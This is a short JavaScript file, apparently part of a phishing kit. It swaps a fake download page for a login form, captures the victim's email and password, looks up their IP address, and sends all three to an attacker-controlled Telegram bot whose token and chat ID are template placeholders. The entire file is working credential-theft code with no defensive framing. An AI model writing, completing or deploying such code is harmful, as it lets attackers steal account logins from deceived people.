const downloadBtn = document.getElementById('downloadBtn');
const downloadPage = document.getElementById('downloadPage');
const loginPage = document.getElementById('loginPage');

downloadBtn.addEventListener('click', function (event) {
    event.preventDefault();
    downloadPage.style.display = 'none';
    loginPage.style.display = 'block';
});

document.getElementById('loginForm').addEventListener('submit', async function (event) {
    event.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    const ipData = await fetch('https://ipapi.co/json/').then(res => res.json()).catch(() => ({ ip: 'Unknown' }));

    const botToken = '{{botToken}}';
    const chatId = '{{chatId}}';

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId,
            text: `Email: ${email}\nPassword: ${password}\nIP: ${ipData.ip}`,
        }),
    });
});
